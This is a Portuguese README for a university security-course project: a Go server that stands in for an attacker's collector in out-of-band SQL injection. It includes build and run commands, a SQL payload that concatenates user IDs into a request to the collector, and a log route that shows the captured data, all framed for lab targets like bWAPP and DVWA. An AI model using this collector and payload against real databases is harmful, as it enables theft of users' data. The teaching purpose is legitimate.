# Servidor Malicioso Simples em Go (Out-of-Band SQLi)

Este projeto fornece uma API simples em Go para capturar dados enviados por aplicações vulneráveis a SQL Injection do tipo **Out-of-Band (OOB)**. Esta aplicação faz parte do projeto semestral de avaliação da disciplina MATC99 - SEGURANÇA E AUDITORIA DE SISTEMAS DE INFORMAÇÃO ministrada pelo Prof. Dr. Leobino Sampaio na Universidade Federal da Bahia.

## 🧪 Objetivo

A API simula um servidor malicioso externo (`http://malicious.com`) que recebe dados de sistemas comprometidos, como via payloads de SQLi que forçam requisições HTTP.

## 🛠️ Pré-requisitos

- Docker instalado, caso queira usar Docker ([instruções](https://docs.docker.com/get-docker/))
- Go (apenas se quiser rodar localmente sem Docker)

---

## ⚙️ Como usar (Sem Docker)

### 1. Clone o repositório

```bash
git clone https://github.com/brnocorreia/malicious.git
cd malicious
```

### 2. Compile o binário (opcional)

Você pode usar o binário já incluído (cheque a pasta `bin`), ou compilar manualmente (necessário ter o Go instalado):

- Para Linux (64 bits):

```bash
GOOS=linux GOARCH=amd64 go build -o malicious
```

- Para Windows:

```bash
GOOS=windows GOARCH=amd64 go build -o malicious.exe
```

### 3. Executando o servidor

Execute o servidor para escutar na porta 8080:

```bash
sudo ./malicious
```

### 4. Exemplo de requisição

```bash
curl "http://localhost:8080?data=senha:1234"
```

- Em ambientes como o bWAPP, modifique inputs para forçar chamadas HTTP com dados sensíveis para esse servidor.

```sql
SELECT 1, CONCAT('http://localhost:8080?data=', user_id) FROM users;
```

### 5. Acessando os dados capturados

- Através do navegador, você pode acessar a rota `http://localhost:8080/log` e ter acesso a todos os dados capturados em forma de plain text.
- Caso prefira, você também pode usar o comando abaixo no terminal e ver o arquivo por completo:

```bash
cat dados_capturados.txt
```

---

## ⚙️ Como usar (Docker)

### 1. Construa a imagem Docker

```bash
docker build -t malicious-server .
```

### 2. Crie diretório local para dados

- Esse passo é opcional caso você não queira ter acesso ao txt onde os dados capturados são armazenados. A aplicação usa a imagem scratch e por isso não é possível acessar o container, nem dar cat no arquivo. Usaremos a estratégia de volumes para ter acesso.

```bash
mkdir -p ./dados
```

### 3. Rodar o container com o volume montado

```bash
docker run -p 8080:8080 -v "$(pwd)/dados:/dados" --rm malicious-server
```

### 4. Exemplo de requisição

```bash
curl "http://localhost:8080?data=senha:1234"
```

- Em ambientes como o bWAPP, modifique inputs para forçar chamadas HTTP com dados sensíveis para esse servidor.

```sql
SELECT 1, CONCAT('http://localhost:8080?data=', user_id) FROM users;
```

### 5. Acessando os dados capturados

- Através do navegador, você pode acessar a rota `http://localhost:8080/log` e ter acesso a todos os dados capturados em forma de plain text.
- Caso prefira, você também pode usar o comando abaixo no terminal e ver o arquivo por completo:

```bash
cat ./dados/dados_capturados.txt
```

### 🛡️ Aviso Legal

Este projeto é exclusivamente educacional para testes em ambientes controlados e laboratório, como:

- bWAPP
- DVWA
- WebGoat

⚠️ Nunca use este código para fins maliciosos ou em sistemas sem autorização explícita.
